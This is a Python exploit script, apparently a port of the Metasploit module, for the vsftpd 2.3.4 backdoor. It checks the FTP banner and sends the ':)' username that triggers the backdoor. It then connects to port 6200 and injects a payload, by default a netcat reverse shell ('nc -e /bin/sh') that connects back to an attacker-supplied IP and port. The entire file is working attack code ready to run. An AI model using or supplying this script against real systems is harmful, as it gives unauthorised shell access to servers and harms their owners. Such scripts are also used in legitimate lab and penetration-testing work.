import argparse
import re
import socket
import sys


def check_service_version(conn: socket.socket) -> bool:
    """
    Check the FTP service to make sure it is vulnerable to this exploit.
    :param conn: socket object connected to backdoor
    :return: boolean indicating vulnerable or not vulnerable
    """
    print('Checking service version.')
    banner_data = conn.recv(1024)
    banner = banner_data.decode().strip()
    print('Banner: {}'.format(banner))
    # check to make sure this is indeed running vsftpd v2.3.4
    if banner.lower() != '220 (vsftpd 2.3.4)':
        return False
    return True


def open_backdoor(conn: socket.socket) -> bool:
    """
    Send the parameters to the FTP server that will open the backdoor port.
    :param conn: socket object connected to backdoor
    :return: boolean indicating success or failure
    """
    print('Opening backdoor.')
    sent_bytes = conn.send('USER abc123:)\r\n'.encode())
    response = conn.recv(1024)
    passwd_response = response.decode().strip()
    passwd_response_code = int(passwd_response.split()[0])
    if passwd_response_code != 331:
        return False
    sent_bytes = conn.send('PASS \r\n'.encode())
    return True


def inject_payload(conn: socket.socket, payload) -> bool:
    """
    Inject a payload into the backdoor connection.
    :param conn: socket object connected to backdoor
    :param payload: payload to inject (usually a reverse shell)
    :return: boolean indicating success or failure
    """
    print('Injecting payload via backdoor.')
    # verify that we have a shell and grab the user ID
    sent_bytes = conn.send('id\n'.encode())
    response = conn.recv(1024)
    uid_data = response.decode().strip()
    if re.search(r'^uid=', uid_data):
        uid = uid_data.split('(')[1].split(')')[0]
        print('Got shell as user {}!'.format(uid))
        # send a simple reverse shell from the exploited server to the attacking host
        print('Injecting and running payload.')
        sent_bytes = conn.send('nohup {} >/dev/null 2>&1\n'.format(payload).encode())
        return True
    else:
        print(uid_data)
        return False


def init_tcp_conn(target: str, port: int) -> socket.socket:
    """
    Generic method to create a TCP socket connection to a specified target on a specified port.
    :param target: target to connect to
    :param port: port to connect to on target
    :return: connected socket object
    """
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((target, port))
    return conn


def init_ftp_conn(target: str) -> socket.socket:
    """
    Create an FTP connection to the specified target.
    :param target: target to connect to
    :return: connected socket object
    """
    return init_tcp_conn(target, 21)


def init_backdoor_conn(target: str) -> socket.socket:
    """
    Create a backdoor connection to the specified target.
    :param target: target to connect to
    :return: connected socket object
    """
    return init_tcp_conn(target, 6200)


def main():
    """
    Main logic.
    :return: None
    """
    parser = argparse.ArgumentParser(description='A Python version of the Metasploit exploit for vsftpd version 2.3.4')
    parser.add_argument('-i', '--inject', help='Custom payload to inject upon successful exploit')
    parser.add_argument('-r', '--revshell-ip',
                        help='Target IP for reverse shell to connect back to upon successful exploit')
    parser.add_argument('-p', '--revshell-port', default=4444,
                        help='Target port for reverse shell to connect back to upon successful exploit (default is 4444)')
    parser.add_argument('target_host', help='Target for exploit')
    args = parser.parse_args()

    # initialize variables
    target = args.target_host
    revshell_ip = args.revshell_ip
    revshell_port = int(args.revshell_port)
    payload = args.inject
    if not payload and not revshell_ip:
        print('ERROR: Must define either a reverse shell target IP or a custom payload.')
        sys.exit(1)
    if not payload:
        payload = 'nc -e /bin/sh {} {}'.format(revshell_ip, revshell_port)

    # initialize connection to FTP service on target server
    conn = init_ftp_conn(target)

    # verify that this server is vulnerable to exploit
    if not check_service_version(conn):
        print('ERROR: This is not a vsftpd server on version 2.3.4, so this exploit will not work. Exiting.')
        sys.exit(100)

    # now that we've verified this server is vulnerable, open the backdoor
    if not open_backdoor(conn):
        print('ERROR: The server did not respond as expected. Exiting.')
        sys.exit(101)

    # the backdoor should now be open, so we connect to it with a new socket connection
    backdoor_conn = init_backdoor_conn(target)

    # try to inject the payload
    if inject_payload(backdoor_conn, payload):
        print('Exploit successful!')
    else:
        print('ERROR: Did not gain shell. Exploit failed.')

    # clean up
    print('Closing connections to server.')
    backdoor_conn.close()
    conn.close()
    print('Exploit complete.')


if __name__ == '__main__':
    main()
